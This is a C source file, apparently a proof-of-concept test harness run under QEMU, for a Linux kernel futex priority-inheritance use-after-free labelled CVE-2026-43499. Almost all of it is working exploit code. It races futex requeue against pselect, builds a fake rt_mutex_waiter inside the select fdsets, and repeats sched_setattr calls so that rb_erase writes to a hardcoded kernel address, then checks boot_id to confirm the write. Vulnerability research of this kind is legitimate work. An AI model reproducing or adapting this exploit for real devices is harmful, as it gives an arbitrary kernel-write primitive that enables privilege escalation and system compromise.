/* QEMU control experiment for CVE-2026-43499 on the real aristotle kernel.
 *
 * Question: given (a) the dangling pi_blocked_on, (b) a CORRECT fake rt_mutex_waiter
 * overlay in the pselect fdset, and (c) a chain walk that runs while the waiter is
 * BLOCKED inside do_select, does rt_mutex_adjust_prio_chain perform the rb-erase
 * store?  Proof channel: aim the store at &sysctl_bootid and read
 * /proc/sys/kernel/random/boot_id before/after (exactly like the device build).
 *
 * gdb injects g_base (the kernel fdset address == the freed rt_waiter) once, so the
 * overlay can carry a self-contained fake rt_mutex in words 11..14 of the same
 * buffer. Everything else is static.
 *
 * The consumer ALTERNATES sched_policy so __sched_setscheduler never takes the
 * `policy == p->policy` early-out; it can therefore fire an unlimited number of
 * real walks (the nice value can only ever increase 19 times).
 */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_openat 56
#define SYS_close 57
#define SYS_read 63
#define SYS_write 64
#define SYS_pselect6 72
#define SYS_fcntl 25
#define SYS_dup3 24
#define SYS_timerfd_create 85
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_exit 93
#define SYS_futex 98
#define SYS_nanosleep 101
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_clone 220
#define SYS_sched_setattr 274
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define SCHED_OTHER 0
#define SCHED_BATCH 3
#define CLONE_FLAGS 0x50f00

#define KBASE            0xffffffc010000000UL
#define SYSCTL_BOOTID    (KBASE + 0x02a3f345UL)
#define INIT_TASK        (KBASE + 0x0277bf80UL)
/* 0x29f0000 sits deep inside the 192KB all-zero .bss gap after `lt_pinner`
 * (MTK-only array, never touched on QEMU virt): a fully static, zeroed fake
 * rt_mutex { wait_lock=0, waiters.rb_root=0, rb_leftmost=0, owner=NULL } plus a
 * writable `parent` node -- so the overlay needs no runtime kernel address. */
#define SCRATCH          (KBASE + 0x029f0000UL)

static volatile long g_log = 1;   /* high-fd console dup: fds 0..2 get claimed below */
static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,g_log,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,g_log,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<open failed "); putx_((unsigned long)fd); puts_(">\n"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,g_log,(long)buf,n,0,0,0);
  puts_("\n");
}

__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, armed, done_;
volatile long waiter_tid;


static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));
static unsigned long inb[16], outb[16], exb[16];

/* 5.10 flat rt_mutex_waiter over the 30-long select buffer (5 longs per set,
 * nfds=320): words 0..4 = in[], 5..9 = out[], 10..14 = ex[].
 *   w0 tree.__rb_parent_color = write_value (also used as `parent`)
 *   w1 tree.rb_right = 0
 *   w2 tree.rb_left  = write_target      <-- rb_erase stores write_value HERE
 *   w3..w5 pi_tree_entry (same shape)
 *   w6 task, w7 lock, w8 prio, w9 deadline, w10 = 0
 *   w11..w14 = a self-contained fake rt_mutex { wait_lock, waiters.rb_root,
 *              waiters.rb_leftmost, owner }
 */
static void build_overlay(void){
  unsigned long parent = SCRATCH + 0x100;  /* rb "parent": +0x08/+0x10 zero, writable */
  unsigned long lock   = SCRATCH;          /* fake rt_mutex, all zero */
  for(int k=0;k<16;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  inb[0]=parent;            /* w0  tree.__rb_parent_color = write_value */
  inb[1]=0;                 /* w1  tree.rb_right                       */
  inb[2]=SYSCTL_BOOTID;     /* w2  tree.rb_left  <- rb_erase stores here */
  inb[3]=parent;            /* w3  pi_tree pc                          */
  inb[4]=0;                 /* w4  pi_tree right                       */
  outb[0]=SYSCTL_BOOTID;    /* w5  pi_tree left                        */
  outb[1]=INIT_TASK;        /* w6  task (only used by a harmless wake)  */
  outb[2]=lock;             /* w7  lock                                */
  outb[3]=3;                /* w8  prio = 3                            */
  outb[4]=0;                /* w9  deadline                            */
}

/* max_select_fd() returns -EBADF unless EVERY set bit in the fdsets names an OPEN
 * fd, so install a never-ready timerfd on all of them (what the exploit's
 * open_selected_fds() does). A timerfd with no settime never polls ready, so
 * pselect blocks for the full timeout. */
static void open_selected(void){
  long tfd = sys(SYS_timerfd_create,CLOCK_MONOTONIC,0,0,0,0,0);
  long hi  = sys(SYS_fcntl,tfd,0,352,0,0,0);      /* F_DUPFD above nfds */
  int n=0;
  for(int fd=0;fd<320;fd++){
    int w=fd/64, b=fd%64;
    if(((inb[w]>>b)&1) || ((outb[w]>>b)&1) || ((exb[w]>>b)&1)){
      sys(SYS_dup3,hi,fd,0,0,0,0);
      n++;
    }
  }
  sys(SYS_close,tfd,0,0,0,0,0);
  puts_("OPEN_SELECTED n="); putx_((unsigned long)n); puts_(" hi="); putx_((unsigned long)hi); puts_("\n");
}

static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  long r=sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("WAITER RETURNED r="); putx_((unsigned long)r); puts_("\n");

  /* grow the fdtable so core_sys_select does not clamp n to max_fds */
  sys(SYS_fcntl,1,0,352,0,0,0);

  { long l=sys(SYS_fcntl,1,0,400,0,0,0); if(l>0) g_log=l; }   /* console -> high fd */
  build_overlay();
  open_selected();
  armed=1;
  {
    long pts[2]={5,0};   /* ONE long pselect: the consumer fires many walks inside */
    long pr=sys(SYS_pselect6,320,(long)inb,(long)outb,(long)exb,(long)pts,0);
    puts_("PSELECT ret="); putx_((unsigned long)pr); puts_("\n");
  }
  armed=0;
  done_=1;
  for(;;) nsleep_us(200000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(200000);
}
struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};
static int consumer_fn(void*a){
  (void)a;
  while(!armed) nsleep_us(1000);
  int i=0;
  while(armed){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;   /* always reaches `change:` */
    at.nice=1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    nsleep_us(20000);
  }
  puts_("CONSUMER CALLS="); putx_((unsigned long)i); puts_("\n");
  for(;;) nsleep_us(200000);
}

void _start(void){
  puts_("\n=== QEMU-E2E3: userspace reached ===\n");
  sys(SYS_mkdirat,AT_FDCWD,(long)"/proc",0755,0,0,0);
  long m=sys(SYS_mount,(long)"proc",(long)"/proc",(long)"proc",0,0,0);
  puts_("mount /proc ret="); putx_((unsigned long)m); puts_("\n");
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  long r=sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE DONE r="); putx_((unsigned long)r); puts_("\n");
  while(!done_) nsleep_us(100000);
  show_bootid("BOOTID_AFTER =");
  puts_("=== QEMU-E2E3: finished ===\n");
  for(;;) nsleep_us(500000);
}
